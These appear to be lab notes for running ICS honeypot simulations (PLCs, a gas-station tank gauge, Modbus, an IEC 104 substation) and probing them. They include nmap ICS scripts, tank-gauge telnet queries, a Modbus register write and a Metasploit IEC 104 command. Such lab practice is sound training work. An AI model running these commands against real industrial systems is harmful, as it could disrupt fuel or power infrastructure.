## A simple honeypot
sudo python3 -m honeypots --setup telnet,http,smb,vnc,snmp

## PLC Simulation 1
Change the first half part of the MAC address to 001C06 \
conpot -f --template default \
sudo nmap <IP_address> -Pn -sU -p 16100 \
sudo nmap <IP_address> -Pn -p- \
snmp-check --port 16100 <IP_Address>


## S7 PLC Simulation 2
sudo python3 \
import snap7 \
s7 = snap7.server.Server() \
s7.create() \
s7.start() \
s7.get_status()

python2 plcscan.py 192.168.168.11 \
sudo nmap 192.168.168.11 -Pn -p 102 --script ~/ICS_attack_scripts/Redpoint/s7-enumerate \
/usr/share/nmap/scripts/s7-info.nse

msfconsole -> search Siemens \
searchsploit 

## Gas Station Controller Simulation
Automatic Tank Gauge
Change the first half part of the MAC address to 00A0F6 \
conpot -f --template guardian_ast \
sudo nmap 192.168.168.12 -Pn -p 10001 --script ~/ICS_attack_scripts/Redpoint/atg-info.nse \
filetype:pdf I20100 \
https://www.veeder.com/us/sites/veeder.com.us/files/2020-09/576013-818%20-%20TLS-3XX%C2%A0Series%20Consoles%20Troubleshooting%20Guide.pdf \
https://www.ericzhang.me/gas-station-atgs-exposed-to-public/ \
telnet 192.168.168.12 10001 \
CTRL + A and I20100 \
Some function codes: \
I20100 1 In-Tank Inventory Report \
I20200 1 In-Tank Delivery Report \
I20300 1 In-Tank Leak Detect Report \
I20400 1 In-Tank Shift Inventory Report \
I20500 1 In-Tank Status Report

## Modbus PLC Simulation
sudo nmap -Pn 192.168.168.12 -p 502 --script ~/ICS_attack_scripts/Redpoint/modbus-discover.nse
metasploit modules -> search modbus

modbus read 192.168.168.12 %MW0 10
modbus write 192.168.168.12 %MW0 0 0 0 0 0 0 0 0 0 

## Pentesting a ChronoGuard Infrastructure Substation
Change the first half part of the MAC address to 001D59 \
nano .local/lib/python3.10/site-packages/conpot/templates/IEC104/snmp/snmp.xml \
Change the snmp port from 161 into 16100 \
conpot -f --template IEC104 \
sudo nmap 192.168.168.12 -p 2404 --script ~/ICS_attack_scripts/Redpoint/iec-identify.nse \
metasploit -> search iec104 \
use auxiliary/client/iec104/iec104 \
set ASDU_ADDRESS <learn_from_nmap_nse> \
check the ChronoGuard manual \
ASDU_ADDRESS 7720 \
COMMAND_ADDRESS 3348 \
COMMAND_TYPE 45 \
COMMAND_VALUE 0




  
